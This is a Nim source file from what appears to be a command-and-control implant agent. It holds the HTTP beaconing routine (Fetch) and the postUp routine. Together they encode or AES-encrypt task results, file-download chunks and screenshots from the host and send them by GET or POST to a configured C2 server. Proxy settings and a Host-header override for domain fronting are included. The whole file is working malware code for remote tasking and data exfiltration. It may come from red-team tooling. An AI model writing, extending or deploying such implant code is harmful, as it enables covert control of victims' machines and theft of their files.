import base64
import asyncdispatch
import httpclient
import config
from checkin import getHostName
from task import Job, SocksMsg
import json
import uri
import tables
when defined(AESPSK):
    from crypto import encryptStr,decryptStr
    from uri import decodeUrl

# TODO sort config
proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.async.} =
    let dataToSend = when defined(AESPSK): encryptStr(curConfig.PayloadUUID, curConfig.Psk, bdata) else: bdata
    var proxySet = false
    var myProxy : Proxy
    when not defined(release):
        echo "CurConfig.ProxyAddress: ", curConfig.ProxyAddress
    if(len(curConfig.ProxyAddress) > 1):
        myProxy = newProxy(curConfig.ProxyAddress, curConfig.ProxyUser & ":" & curConfig.ProxyPassword)
        proxySet = true
    when not defined(release):
        echo "Creating client, is proxyset? ", $(proxySet)
    # check if config.hostheader is set and if it is add httpheader check here
    let client = if proxySet: newAsyncHttpClient(if len(curConfig.UserAgent) > 0: curConfig.UserAgent else: defUserAgent, proxy = myProxy) else: newAsyncHttpClient(if len(curConfig.UserAgent) > 0: curConfig.UserAgent else:defUserAgent)
    when not defined(release):
        echo "Client has been created"
    if(len(curConfig.HostHeader) > 0):
        client.headers = newHttpHeaders({"Host": curConfig.HostHeader})
    # var temp = curConfig
    # temp.Servers.sort(serverCmp)
    # TODO SORT
    # curConfig.Servers.sort(serverCmp)
    # curConfig = temp
    try:
        if isGet:
            when not defined(release):
                echo "Attempting to create get url"
                echo "dataToSend: ", dataToSend
                echo "curConfig: ", $(curConfig)
                echo "get url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend})
                echo "making request"
            result = await getContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend}))
        else:
            when not defined(release):
                echo "post url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl), " data is: ", dataToSend
            result = await postContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl), dataToSend)
        when not defined(release):
            echo "Just received data back from get or post request: ", result
        when defined(AESPSK):
            result = decryptStr(curConfig.PayloadUUID, curConfig.Psk, result)
    except:
        let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
        when defined(release):
            echo "An exception has occurred when attempting to do a GET request: ", repr(e), " with message ", msg
        result = repr(e)
    finally:
        # Clean up connections
        close(client)

proc postUp*(curConfig: Config, results: seq[Job], socks_out: Table[int, SocksMsg]): Future[tuple[postupResp: string, resSeq: seq[Job]]] {.async.} =
    var newJobSeq: seq[Job]
    var isDownloadFirst = false
    var isUploadFirst = false
    var taskTable = initTable[string, Job]()
    try:
        if (len(results) > 0 or len(socks_out) > 0):
            let respJson = %*{"action" : "post_response", "responses": [], "socks": []}
            #for k, v in socks_out:
            #    var jNode: JsonNode
            #    jNode = %*
            #        {
            #                "server_id": v.ServerId,
            #                "data": v.Data,
            #                "exit": v.Exit
            #        }
            #    respJson["socks"].add(jNode)
            for i in 0..len(results)-1:
                var job = results[i]
                when not defined(release):
                    echo "Got job: ", $(job)
                var jNode: JsonNode
                if job.Download or job.Screenshot:
                    when defined(release):
                        echo "Inside postUp job is a download job"
                    if len(job.FileId) == 0:
                        when defined(release):
                            echo "length of FileId is 0"
                            #echo job
                        jNode = %*
                            {
                                    "total_chunks": job.TotalChunks,
                                    "task_id": job.TaskId,
                                    "full_path": job.Path,
                                    "host": getHostname(),
                                    "is_screenshot": job.Screenshot
                            }
                        echo jNode
                        # Add this index to indices as we need to parse the result later and then add to resSeq
                        # also need to toggle flag as this is first time downloading need to parse file_id
                        isDownloadFirst = true
                        taskTable[job.TaskId] = job
                    elif job.ChunkNum == job.TotalChunks:
                        when defined(release):
                            echo "chunknum == totalchunks"
                        jNode = %*
                            {
                                    "total_chunks": job.TotalChunks,
                                    "file_id": job.FileId,
                                    "user_output": job.Response.decode(), #& job.FileId,
                                    "task_id": job.TaskId,
                                    "full_path": job.Path,
                                    "success": job.Success,
                                    "chunk_num": job.ChunkNum,
                                    "chunk_data": job.Response,
                                    "completed": job.Completed
                            }
                    else:
                        echo "ChunkNum: ", job.ChunkNum
                        echo "TotalChunks: ", job.TotalChunks
                        jNode = %*
                            {
                                    "task_id": job.TaskId,
                                    "file_id": job.FileId,
                                    "user_output": job.Response.decode(),
                                    "full_path": job.Path,
                                    "success": job.Success,
                                    "chunk_num": job.ChunkNum,
                                    "chunk_data": job.Response,
                                    "completed": job.Completed
                            }
                        newJobSeq.add(job)
                elif (job.Upload or job.ExeAsm) and (job.Completed == false):
                    jNode = %*
                            {
                            "upload": {
                                    "file_id": job.FileId,
                                    "chunk_size": curConfig.ChunkSize,
                                    "chunk_num": job.ChunkNum,
                                    "full_path": job.Path,
                            },
                            "task_id": job.TaskId
                            }
                    echo "build the upload json: ", jNode
                    newJobSeq.add(job)
                else:
                    jNode = %*
                            {
                                    "task_id": job.TaskId,
                                    "user_output": job.Response,
                                    "success": job.Success,
                                    "completed": job.Completed
                            }
                respJson["responses"].add(jNode)
            when not defined(release):
                #echo "respJson: ", $(respJson)
                echo "message: ", $(respJson)
            let data = when defined(AESPSK): $(respJson) else: encode(curConfig.PayloadUUID & $(respJson), true)
            #echo "This get's send to Fetch ", data
            let fetchData = await Fetch(curConfig, data, false)
            #echo "This is what we got back from the server: ", fetchData
            #echo "response_data from message: ", decode(fetchData)
            if isDownloadFirst:
                when defined(release):
                    echo "isdownload first \n"
                    # Indicates json response needs to be parsed for file_id
                let parsedJson = when defined(AESPSK): parseJson(fetchData[36 .. ^1]) else: parseJson(decode(fetchData)[36 .. ^1])
                when not defined(release):
                    echo "parsed Json: ", $(parsedJson)
                for resp in parsedJson["responses"].getElems():
                    # check if taskid is in dictionary if so
                    # extract file_id value and set it equal to correct Job
                    let jtaskid = resp["task_id"].getStr()
                    if taskTable.hasKey(jtaskid):
                        when not defined(release):
                            echo "key has been found in dict: here is resp: ", $(resp)
                        let file_id = resp["file_id"].getStr()
                        var jobValue = taskTable[jtaskid]
                        jobValue.FileId = file_id
                        when not defined(release):
                            echo "updated fileid in jobValue, adding it to newJobSeq ", $(jobValue)
                        newJobSeq.add(jobValue)
                    when not defined(release):
                        echo "resp: ", $(resp)
                        
            result = (postupResp: fetchData, resSeq: newJobSeq)
        else:
            result = (postupResp: "No new jobs", resSeq: newJobSeq)
    except:
        let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
        result = (postupResp: "An exception has occurred when attempting to do a GET reuqest: " & repr(e) & " with message " & msg, resSeq: newJobSeq)
